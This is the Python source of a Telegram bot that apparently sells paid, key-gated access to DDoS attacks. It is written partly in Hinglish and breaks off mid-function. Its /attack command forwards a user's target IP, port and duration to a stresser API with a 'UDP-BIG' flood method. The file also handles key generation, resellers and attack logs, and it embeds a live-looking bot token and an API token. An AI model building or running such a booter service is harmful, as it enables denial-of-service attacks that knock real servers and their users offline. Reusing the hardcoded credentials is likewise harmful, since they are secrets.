#!/usr/bin/env python3
"""
˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝐒 𝙾𝙽𝙸𝙓˼ ♪
Owner: 1987818347
"""

import telebot
from telebot.types import ReplyKeyboardMarkup
import threading
import os
import re
import sys
import json
import random
import string
from datetime import datetime, timedelta
import time
import requests

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIG =============
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAHgWlvO3Jx6po3OVD5f4QHt-_C3tJDm0JY")
BOT_OWNER = 1987818347

BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝐒 𝙾𝙽𝙸𝙓˼ ♪"

DEFAULT_API_URL = "https://stresser.works/api/start"
DEFAULT_API_TOKEN = "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563"
DEFAULT_API_METHOD = "UDP-BIG"
DEFAULT_API_GEOLOCATION = "ALL"

DATA_FILE = "bot_data.json"

# ============= DATA =============
def load_data():
    default = {
        "users": {}, "keys": {}, "resellers": {},
        "admins": {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}},
        "approved_groups": {}, "attack_logs": [], "admin_logs": [],
        "banned_users": {}, "feedbacks": [],
        "stickers": [],
        "videos": [],
        "pyf_videos": [],
        "settings": {
            "max_attack_time": 300,
            "user_cooldown": 30,
            "maintenance_mode": False,
            "maintenance_msg": "Bot under maintenance.",
            "api_url": DEFAULT_API_URL,
            "api_token": DEFAULT_API_TOKEN,
            "api_method": DEFAULT_API_METHOD,
            "api_geolocation": DEFAULT_API_GEOLOCATION,
        }
    }
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    for k, v in default.items():
                        d.setdefault(k, v)
                    for sk, sv in default["settings"].items():
                        d["settings"].setdefault(sk, sv)
                    return d
        except:
            pass
    return default

def save_data(d):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(d, f, indent=2, default=str)
    except:
        pass

data = load_data()
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ============= RANDOM ROTATION =============
_sticker_pool = []
_video_pool = []
_pyf_pool = []

def get_random_sticker():
    global _sticker_pool
    stickers = data.get("stickers", [])
    if not stickers: return None
    if not _sticker_pool:
        _sticker_pool = stickers.copy()
        random.shuffle(_sticker_pool)
    return _sticker_pool.pop()

def get_random_video():
    global _video_pool
    videos = data.get("videos", [])
    if not videos: return None
    if not _video_pool:
        _video_pool = videos.copy()
        random.shuffle(_video_pool)
    return _video_pool.pop()

def get_random_pyf():
    global _pyf_pool
    pyfs = data.get("pyf_videos", [])
    if not pyfs: return None
    if not _pyf_pool:
        _pyf_pool = pyfs.copy()
        random.shuffle(_pyf_pool)
    return _pyf_pool.pop()

# ============= HELPERS =============
def is_owner(uid): return uid == BOT_OWNER or str(uid) in data["admins"]
def is_reseller(uid):
    r = data["resellers"].get(str(uid))
    return r is not None and not r.get('blocked', False)
def is_banned(uid): return str(uid) in data["banned_users"]
def get_setting(k, d=None): return data["settings"].get(k, d)
def set_setting(k, v):
    data["settings"][k] = v
    save_data(data)

def gen_key(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def fmt_key(k):
    return '-'.join([k[i:i+4] for i in range(0, len(k), 4)])

def has_valid_key(uid):
    if is_owner(uid) or is_reseller(uid): return True
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return False
    try: return datetime.now() <= datetime.fromisoformat(u['key_expiry'])
    except: return False

def time_remaining(uid):
    if is_owner(uid): return "Unlimited (Owner)"
    if is_reseller(uid): return "Unlimited (Reseller)"
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return "No Key"
    try:
        rem = datetime.fromisoformat(u['key_expiry']) - datetime.now()
        if rem.total_seconds() <= 0: return "Expired"
        d = rem.days; h, r = divmod(rem.seconds, 3600); m, _ = divmod(r, 60)
        return f"{d}d {h}h {m}m"
    except: return "Error"

user_cooldown = {}
attack_lock = threading.Lock()
active_attacks = {}

def get_cd_remaining(uid):
    if uid in user_cooldown:
        r = user_cooldown[uid] - time.time()
        if r > 0: return int(r)
        del user_cooldown[uid]
    return 0

def set_cd(uid):
    cd = get_setting('user_cooldown', 30)
    if cd > 0: user_cooldown[uid] = time.time() + cd

def is_attack_running():
    with attack_lock:
        now = datetime.now()
        for aid, atk in list(active_attacks.items()):
            if atk['end_time'] <= now: del active_attacks[aid]
        return len(active_attacks) > 0

def ist_now():
    return (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')

# ============= API =============
def api_attack(ip, port, dur):
    try:
        url = get_setting("api_url", DEFAULT_API_URL)
        token = get_setting("api_token", DEFAULT_API_TOKEN)
        method = get_setting("api_method", DEFAULT_API_METHOD)
        geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
        req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
        resp = requests.get(req, timeout=10)
        if resp.status_code == 200: return True, resp.text
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        return False, str(e)

# ============= KEYBOARDS =============
def kb_main(uid):
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    if is_owner(uid):
        m.row("🔥 ATTACK", "📊 STATUS")
        m.row("👤 PROFILE", "👑 OWNER PANEL")
    elif is_reseller(uid) or has_valid_key(uid):
        m.row("🔥 ATTACK", "📊 STATUS")
        m.row("🔑 REDEEM", "👤 PROFILE")
    else:
        m.row("🔑 REDEEM", "👤 PROFILE")
    return m

def kb_owner():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row("🔑 GEN KEY", "👥 USERS")
    m.row("📊 STATS", "📢 BROADCAST")
    m.row("⚙️ SETTINGS", "❌ CLOSE")
    return m

# ============= START COMMAND =============
@bot.message_handler(commands=['start', 'help'])
def cmd_start(msg):
    uid = msg.from_user.id
    if is_banned(uid):
        bot.reply_to(msg, "🚫 You are banned from using this bot.")
        return

    name = msg.from_user.first_name or "User"
    username = msg.from_user.username
    cid = msg.chat.id

    # ===== CHECKING ANIMATION (with PYF video attached) =====
    check_text = (
        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n"
        "⏳ Starting..."
    )

    chosen_pyf_start = get_random_pyf()
    if chosen_pyf_start:
        try:
            check = bot.send_video(cid, chosen_pyf_start, caption=check_text, parse_mode="HTML")
        except:
            check = bot.send_message(cid, check_text, parse_mode="HTML")
    else:
        check = bot.send_message(cid, check_text, parse_mode="HTML")

    steps = [
        ("▰▱▱▱▱▱▱▱▱▱", "10%", "📡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘀𝗲𝗿𝘃𝗲𝗿..."),
        ("▰▰▰▱▱▱▱▱▱▱", "30%", "👤 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐮𝐬𝐞𝐫..."),
        ("▰▰▰▰▰▱▱▱▱▱", "50%", "⚙️ 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙥𝙧𝙤𝙛𝙞𝙡𝙚..."),
        ("▰▰▰▰▰▰▰▱▱▱", "70%", "🔑 ᴄʜᴇᴄᴋɪɴɢ ᴋᴇʏ ꜱᴛᴀᴛᴜꜱ..."),
        ("▰▰▰▰▰▰▰▰▰▱", "90%", "⏳ 𝘍𝘪𝘯𝘢𝘭𝘪𝘻𝘪𝘯𝘨..."),
        ("▰▰▰▰▰▰▰▰▰▰", "100%", "✅ Ｖｅｒｉｆｉｅｄ!"),
    ]

    for bar, pct, status in steps:
        time.sleep(0.7)
        try:
            bot.edit_message_caption(
                chat_id=cid,
                message_id=check.message_id,
                caption=(
                    "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                    "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                    "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                    f"{bar} {pct}\n"
                    f"{status}"
                ),
                parse_mode="HTML"
            )
        except:
            try:
                bot.edit_message_text(
                    chat_id=cid,
                    message_id=check.message_id,
                    text=(
                        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                        f"{bar} {pct}\n"
                        f"{status}"
                    ),
                    parse_mode="HTML"
                )
            except:
                pass

    time.sleep(0.8)

    # ===== CHECK USER STATUS =====
    is_new = str(uid) not in data["users"]

    if is_new:
        data["users"][str(uid)] = {
            "username": username or name,
            "joined_at": datetime.now().isoformat(),
            "total_attacks": 0,
            "key_expiry": None
        }
        save_data(data)

    has_key = has_valid_key(uid)
    time_left = time_remaining(uid)

    try:
        bot.delete_message(cid, check.message_id)
    except: pass

    # ============================================================
    # ⭐ STICKER → 5 SEC → FINAL MSG → 1 SEC → STICKER DELETE
    # ============================================================
    sticker_msg = None
    chosen_sticker = get_random_sticker()
    if chosen_sticker:
        try:
            sticker_msg = bot.send_sticker(cid, chosen_sticker)
            time.sleep(5)  # ← 5 second pura sticker dikhega
        except Exception as e:
            print(f"Sticker Error: {e}")

    # ===== FINAL MESSAGE (sticker ke 5 sec baad aayega) =====
    header = (
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
        f"┊         {BOT_NAME}              ┊\n"
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
    )

    if is_new and not has_key:
        text = header + (
            f"\n👋 <b>Welcome, {name}!</b>\n\n"
            "🎉 Aapka account successfully create ho gaya!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ <b>Status:</b> No Active Key\n"
            f"🎯 <b>Method:</b> <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
            "⚡ <b>Bot:</b> 🟢 ONLINE\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>Kaise Start Kare?</b>\n\n"
            "1️⃣ <b>Redeem Key</b>\n"
            "   ➤ <code>/redeem YOUR-KEY</code>\n\n"
            "2️⃣ <b>Launch Attack</b>\n"
            "   ➤ <code>/attack IP PORT TIME</code>\n\n"
            "3️⃣ <b>Check Profile</b>\n"
            "   ➤ <code>/profile</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <b>Bina key ke attack nahi lagega!</b>\n"
            "🔑 Key lene ke liye owner se contact karo.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 <b>Neeche buttons se start karo</b>"
        )
    elif has_key:
        u = data["users"].get(str(uid), {})
        total_attacks = u.get("total_attacks", 0)
        role = "👑 OWNER" if is_owner(uid) else ("💼 RESELLER" if is_reseller(uid) else "👤 USER")

        text = header + (
            f"\n👋 <b>Welcome back, {name}!</b>\n\n"
            "✅ <b>Key Verified Successfully</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Role:</b> {role}\n"
            f"🆔 <b>ID:</b> <code>{uid}</code>\n"
            f"⏰ <b>Time Left:</b> <b>{time_left}</b>\n"
            f"🎯 <b>Total Attacks:</b> {total_attacks}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>Available Commands:</b>\n"
            "➤ <code>/attack IP PORT TIME</code>\n"
            "➤ <code>/profile</code>\n"
            "➤ <code>/status</code>\n"
            "➤ <code>/redeem KEY</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🔥 <b>Ready to launch attack?</b>"
        )
    else:
        text = header + (
            f"\n👋 <b>Welcome back, {name}!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ <b>Status:</b> No Active Key\n"
            f"🎯 <b>Method:</b> <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
            "⚡ <b>Bot:</b> 🟢 ONLINE\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ <b>Aapki key expire ho gayi hai</b>\n"
            "ya abhi tak redeem nahi ki!\n\n"
            "📌 <b>Key Redeem Karo:</b>\n"
            "➤ <code>/redeem YOUR-KEY</code>\n\n"
            "🔑 Naya key lene ke liye owner se contact karo.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 <b>Neeche buttons se start karo</b>"
        )

    bot.send_message(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")

    # ===== STICKER DELETE (final msg ke 1 sec baad) =====
    if sticker_msg:
        def delete_sticker():
            time.sleep(1)  # ← 1 second baad delete (total 6 sec)
            try:
                bot.delete_message(cid, sticker_msg.message_id)
            except:
                pass
        threading.Thread(target=delete_sticker, daemon=True).start()

# ============= ATTACK =============
@bot.message_handler(commands=['attack'])
def cmd_attack(msg):
    uid = msg.from_user.id
    if is_banned(uid): return
    cid = msg.chat.id

    if get_setting('maintenance_mode', False) and not is_owner(uid):
        bot.reply_to(msg, f"🔧 {get_setting('maintenance_msg', 'Maintenance')}"); return

    if msg.chat.type in ['group', 'supergroup']:
        if str(cid) not in data["approved_groups"]:
            bot.reply_to(msg, "⚠️ Group not approved!"); return

    if not is_owner(uid) and not has_valid_key(uid):
        bot.reply_to(msg, "⚠️ No active key! /redeem first."); return

    parts = msg.text.split()[1:]
    if len(parts) != 3:
        bot.reply_to(msg, "❌ <b>Usage:</b> <code>/attack IP PORT TIME</code>", parse_mode="HTML"); return

    ip, ps, ds = parts
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        bot.reply_to(msg, "❌ Invalid IP!"); return

    try:
        port = int(ps); dur = int(ds)
        if not (1 <= port <= 65535): bot.reply_to(msg, "❌ Port 1-65535!"); return
        if dur < 1: bot.reply_to(msg, "❌ Min 1s!"); return
        if dur > get_setting('max_attack_time', 300) and not is_owner(uid):
            bot.reply_to(msg, f"❌ Max {get_setting('max_attack_time', 300)}s!"); return
    except:
        bot.reply_to(msg, "❌ Invalid port/time!"); return

    cd = get_cd_remaining(uid)
    if cd > 0 and not is_owner(uid):
        bot.reply_to(msg, f"⏸️ Cooldown: {cd}s"); return

    if is_attack_running():
        bot.reply_to(msg, "❌ Attack already running!"); return

    set_cd(uid)
    name = msg.from_user.username or f"User_{uid}"

    ok, r = api_attack(ip, port, dur)
    if not ok:
        bot.reply_to(msg, f"❌ <b>FAILED</b>\n<code>{r[:300]}</code>", parse_mode="HTML"); return

    # ===== ATTACK LAUNCHED (with video attached) =====
    attack_caption = (
        f"💀 <b>ATTACK LAUNCHED</b> 💀\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: <b>@{name}</b>\n"
        f"🎯 Target: <code>{ip}:{port}</code>\n"
        f"⏱️ Duration: <b>{dur}s</b>\n"
        f"🚀 Method: <b>{get_setting('api_method', 'UDP-BIG')}</b>\n"
        f"📅 Started: <b>{ist_now()} IST</b>"
    )

    chosen_video = get_random_video()
    if chosen_video:
        try:
            bot.send_video(cid, chosen_video, caption=attack_caption, parse_mode="HTML")
        except Exception as e:
            print(f"Video Error: {e}")
            bot.reply_to(msg, attack_caption, parse_mode="HTML")
    else:
        bot.reply_to(msg, attack_caption, parse_mode="HTML")

    data["attack_logs"].append({
        'user_id': uid, 'username': name, 'target': ip, 'port': port,
        'duration': dur, 'timestamp': datetime.now().isoformat()
    })
    save_data(data)

    aid = f"{uid}_{time.time()}"
    with attack_lock:
        active_attacks[aid] = {
            'target': ip, 'port': port,
            'end_time': datetime.now() + timedelta(seconds=dur)
        }

    def done():
        time.sleep(dur)
        with attack_lock: active_attacks.pop(aid, None)
        complete_caption = f"✅ <b>ATTACK COMPLETE</b>\n🎯 {ip}:{port} | {dur}s"
        chosen_video_done = get_random_video()
        if chosen_video_done:
            try:
                bot.send_video(cid, chosen_video_done, caption=complete_caption, parse_mode="HTML")
            except:
                try:
                    bot.send_message(cid, complete_caption, parse_mode="HTML")
                except: pass
        else:
            try:
                bot.send_message(cid, complete_caption, parse_mode="HTML")
            except: pass

    threading.Thread(target=done, daemon=True).start()

# ============= KEY MANAGEMENT =============
@bot.message_handler(commands=['genkey', 'gen'])
def cmd_gen(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        bot.reply_to(msg, "⚠️ <code>/genkey DAYS [AMOUNT]</code>", parse_mode="HTML"); return
    try:
        days = int(p[1]); amt = int(p[2]) if len(p) > 2 else 1
    except:
        bot.reply_to(msg, "❌ Invalid!"); return

    keys = []
    for _ in range(amt):
        raw = gen_key(16); formatted = fmt_key(raw)
        data["keys"][formatted] = {
            "days": days, "created_at": datetime.now().isoformat(),
            "used": False, "used_by": None
        }
        keys.append(formatted)
    save_data(data)

    txt = f"✅ <b>Generated {amt} Key(s)</b>\n━━━━━━━━━━━━━\n"
    for k in keys: txt += f"<code>{k}</code>\n"
    txt += f"━━━━━━━━━━━━━\n⏰ Duration: <b>{days} days</b>"
    bot.reply_to(msg, txt, parse_mode="HTML")

@bot.message_handler(commands=['redeem'])
def cmd_redeem(msg):
    uid = msg.from_user.id
    if is_banned(uid): return
    p = msg.text.split()
    if len(p) < 2:
        bot.reply_to(msg, "⚠️ <code>/redeem KEY</code>", parse_mode="HTML"); return
    key = p[1].strip().upper()
    if key not in data["keys"]:
        bot.reply_to(msg, "❌ Invalid key!"); return
    kinfo = data["keys"][key]
    if kinfo.get("used"):
        bot.reply_to(msg, "❌ Already used!"); return

    days = kinfo["days"]
    expiry = datetime.now() + timedelta(days=days)
    data["users"].setdefault(str(uid), {})
    existing = data["users"][str(uid)].get("key_expiry")
    if existing:
        try:
            old_exp = datetime.fromisoformat(existing)
            if old_exp > datetime.now():
                expiry = old_exp + timedelta(days=days)
        except: pass
    data["users"][str(uid)]["key_expiry"] = expiry.isoformat()
    data["users"][str(uid)]["username"] = msg.from_user.username or msg.from_user.first_name
    kinfo["used"] = True; kinfo["used_by"] = uid
    kinfo["used_at"] = datetime.now().isoformat()
    save_data(data)
    bot.reply_to(msg, f"✅ <b>KEY REDEEMED!</b>\n⏰ +{days} days\n📅 Expires: <b>{expiry.strftime('%d %b %Y')}</b>", parse_mode="HTML")

# ============= PROFILE / STATUS =============
@bot.message_handler(commands=['profile'])
def cmd_profile(msg):
    uid = msg.from_user.id
    u = data["users"].get(str(uid), {})
    txt = (
        f"👤 <b>PROFILE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: <code>{uid}</code>\n"
        f"📛 Name: <b>{msg.from_user.first_name}</b>\n"
        f"⏰ Time: <b>{time_remaining(uid)}</b>\n"
        f"🎯 Attacks: <b>{u.get('total_attacks', 0)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def cmd_status(msg):
    with attack_lock:
        now = datetime.now()
        running = [(a, atk) for a, atk in active_attacks.items() if atk['end_time'] > now]
    txt = (
        f"📊 <b>STATUS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot: <b>ONLINE</b>\n"
        f"⏱️ Uptime: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>\n"
        f"👥 Users: <b>{len(data['users'])}</b>\n"
        f"💀 Attacks: <b>{len(data['attack_logs'])}</b>\n"
    )
    if running:
        for a, atk in running:
            rem = int((atk['end_time'] - now).total_seconds())
            txt += f"⚔️ {atk['target']}:{atk['port']} ({rem}s)\n"
    else:
        txt += "💤 No active attacks"
    bot.reply_to(msg, txt, parse_mode="HTML")

# ============= OWNER PANEL =============
@bot.message_handler(commands=['panel'])
def cmd_panel(msg):
    if not is_owner(msg.from_user.id): return
    bot.reply_to(msg, "👑 <b>OWNER PANEL</b>", reply_markup=kb_owner(), parse_mode="HTML")

@bot.message_handler(commands=['users'])
def cmd_users(msg):
    if not is_owner(msg.from_user.id): return
    if not data["users"]:
        bot.reply_to(msg, "📂 No users."); return
    txt = "👥 <b>USERS</b>\n━━━━━━━━━━━━━\n"
    for i, (uid, u) in enumerate(list(data["users"].items())[:50], 1):
        txt += f"{i}. <code>{uid}</code> | {u.get('total_attacks', 0)} attacks\n"
    bot.reply_to(msg, txt, parse_mode="HTML")

@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split(maxsplit=1)
    if len(p) < 2:
        bot.reply_to(msg, "⚠️ /broadcast MSG"); return
    text = p[1]; sent = 0
    for uid in data["users"]:
        try:
            bot.send_message(int(uid), f"📢 <b>BROADCAST</b>\n\n{text}", parse_mode="HTML")
            sent += 1
        except: pass
    bot.reply_to(msg, f"✅ Sent to {sent} users.")

@bot.message_handler(commands=['stats'])
def cmd_stats(msg):
    if not is_owner(msg.from_user.id): return
    txt = (
        f"📊 <b>STATS</b>\n"
        f"👥 Users: <b>{len(data['users'])}</b>\n"
        f"🔑 Keys: <b>{len(data['keys'])}</b>\n"
        f"💀 Attacks: <b>{len(data['attack_logs'])}</b>\n"
        f"❄ Stickers: <b>{len(data.get('stickers', []))}</b>\n"
        f"📹 Videos: <b>{len(data.get('videos', []))}</b>\n"
        f"🎬 PYF Videos: <b>{len(data.get('pyf_videos', []))}</b>\n"
        f"⏱️ Uptime: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def cmd_ban(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /ban ID"); return
    data["banned_users"][p[1]] = datetime.now().isoformat()
    save_data(data); bot.reply_to(msg, f"✅ Banned {p[1]}")

@bot.message_handler(commands=['unban'])
def cmd_unban(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /unban ID"); return
    if p[1] in data["banned_users"]:
        del data["banned_users"][p[1]]; save_data(data)
        bot.reply_to(msg, "✅ Unbanned")
    else: bot.reply_to(msg, "❌ Not banned")

@bot.message_handler(commands=['setapi'])
def cmd_setapi(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 3: bot.reply_to(msg, "⚠️ /setapi URL TOKEN"); return
    set_setting("api_url", p[1]); set_setting("api_token", p[2])
    if len(p) > 3: set_setting("api_method", p[3])
    if len(p) > 4: set_setting("api_geolocation", p[4])
    bot.reply_to(msg, "✅ API Updated!")

@bot.message_handler(commands=['testapi'])
def cmd_testapi(msg):
    if not is_owner(msg.from_user.id): return
    ok, r = api_attack("1.1.1.1", 80, 5)
    if ok: bot.reply_to(msg, f"✅ <b>API OK</b>\n<code>{r[:300]}</code>", parse_mode="HTML")
    else: bot.reply_to(msg, f"❌ <b>API FAILED</b>\n<code>{r[:300]}</code>", parse_mode="HTML")

@bot.message_handler(commands=['setmaxtime'])
def cmd_setmaxtime(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /setmaxtime SEC"); return
    set_setting("max_attack_time", int(p[1]))
    bot.reply_to(msg, f"✅ Max: {p[1]}s")

@bot.message_handler(commands=['setcooldown'])
def cmd_setcooldown(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /setcooldown SEC"); return
    set_setting("user_cooldown", int(p[1]))
    bot.reply_to(msg, f"✅ Cooldown: {p[1]}s")

@bot.message_handler(commands=['maintenance'])
def cmd_maintenance(msg):
    if not is_owner(msg.from_user.id): return
    cur = get_setting('maintenance_mode', False)
    set_setting("maintenance_mode", not cur)
    bot.reply_to(msg, f"✅ Maintenance: {'ON' if not cur else 'OFF'}")

# ============= STICKER COMMANDS =============
@bot.message_handler(commands=['removesticker'])
def cmd_removesticker(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["stickers"]:
            bot.reply_to(msg, "❄ Koi sticker nahi hai.")
            return
        txt = "❄ <b>STICKERS LIST:</b>\n━━━━━━━━━━━━━\n"
        for i, s in enumerate(data["stickers"], 1):
            txt += f"{i}. <code>{s}</code>\n"
        txt += "\n❌ Remove: <code>/removesticker NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML")
        return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["stickers"]):
            data["stickers"].pop(idx)
            save_data(data)
            bot.reply_to(msg, f"✅ Sticker #{p[1]} removed!\n❄ Total: <b>{len(data['stickers'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "❌ Invalid number!")
    except:
        bot.reply_to(msg, "❌ Usage: <code>/removesticker NUMBER</code>", parse_mode="HTML")

@bot.message_handler(commands=['liststickers'])
def cmd_liststickers(msg):
    if not is_owner(msg.from_user.id): return
    if not data["stickers"]:
        bot.reply_to(msg, "❄ Koi sticker nahi hai.")
        return
    txt = "❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥𝗦\n"
    for i, s in enumerate(data["stickers"], 1):
        txt += f"{i}. {s}\n"
    txt += f"\n🔹 𝗧𝗼𝘁𝗮𝗹 {len(data['stickers'])}"
    bot.reply_to(msg, txt)

# ============= VIDEO COMMANDS (Attack wali) =============
@bot.message_handler(commands=['listvideo'])
def cmd_listvideo(msg):
    if not is_owner(msg.from_user.id): return
    if not data["videos"]:
        bot.reply_to(msg, "📹 Koi video nahi hai.")
        return
    txt = "📹 🇻 🇮 🇩 🇪 🇴 🇸 ：\n"
    for i, v in enumerate(data["videos"], 1):
        txt += f"🛸{i} {v}\n"
    txt += f"\n⎘ 丅ᗝ丅ᗩᒪ ： {len(data['videos'])}"
    bot.reply_to(msg, txt)

@bot.message_handler(commands=['delvideo'])
def cmd_delvideo(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["videos"]:
            bot.reply_to(msg, "📹 Koi video nahi hai.")
            return
        txt = "📹 <b>VIDEOS LIST:</b>\n━━━━━━━━━━━━━\n"
        for i, v in enumerate(data["videos"], 1):
            txt += f"{i}. <code>{v}</code>\n"
        txt += "\n❌ Delete: <code>/delvideo NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML")
        return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["videos"]):
            data["videos"].pop(idx)
            save_data(data)
            bot.reply_to(msg, f"✅ Video #{p[1]} removed!\n📹 Total: <b>{len(data['videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "❌ Invalid number!")
    except:
        bot.reply_to(msg, "❌ Usage: <code>/delvideo NUMBER</code>", parse_mode="HTML")

# ============= PYF VIDEO COMMANDS =============
@bot.message_handler(commands=['addpyf'])
def cmd_addpyf(msg):
    if not is_owner(msg.from_user.id): return
    _pending_pyf[msg.from_user.id] = True
    bot.reply_to(msg, "📤 Ab ek <b>video</b> forward karo jo /start ke saath attach hoga.", parse_mode="HTML")

@bot.message_handler(commands=['listpyf'])
def cmd_listpyf(msg):
    if not is_owner(msg.from_user.id): return
    if not data["pyf_videos"]:
        bot.reply_to(msg, "🎬 Koi PYF video nahi hai.")
        return
    txt = "🎬 🇵 🇾 🇫 🇻 🇮 🇩 🇪 🇴 🇸 ：\n"
    for i, v in enumerate(data["pyf_videos"], 1):
        txt += f"🛸{i} {v}\n"
    txt += f"\n⎘ 丅ᗝ丅ᗩᒪ ： {len(data['pyf_videos'])}"
    bot.reply_to(msg, txt)

@bot.message_handler(commands=['delpyf'])
def cmd_delpyf(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["pyf_videos"]:
            bot.reply_to(msg, "🎬 Koi PYF video nahi hai.")
            return
        txt = "🎬 <b>PYF VIDEOS LIST:</b>\n━━━━━━━━━━━━━\n"
        for i, v in enumerate(data["pyf_videos"], 1):
            txt += f"{i}. <code>{v}</code>\n"
        txt += "\n❌ Delete: <code>/delpyf NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML")
        return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["pyf_videos"]):
            data["pyf_videos"].pop(idx)
            save_data(data)
            bot.reply_to(msg, f"✅ PYF Video #{p[1]} removed!\n🎬 Total: <b>{len(data['pyf_videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "❌ Invalid number!")
    except:
        bot.reply_to(msg, "❌ Usage: <code>/delpyf NUMBER</code>", parse_mode="HTML")

# ============= AUTO STICKER =============
@bot.message_handler(content_types=['sticker'])
def auto_sticker(msg):
    uid = msg.from_user.id
    if not is_owner(uid): return
    file_id = msg.sticker.file_id
    if file_id not in data["stickers"]:
        data["stickers"].append(file_id)
        save_data(data)
        bot.reply_to(msg, f"✅ Sticker auto-added!\n❄ Total: <b>{len(data['stickers'])}</b>", parse_mode="HTML")
    else:
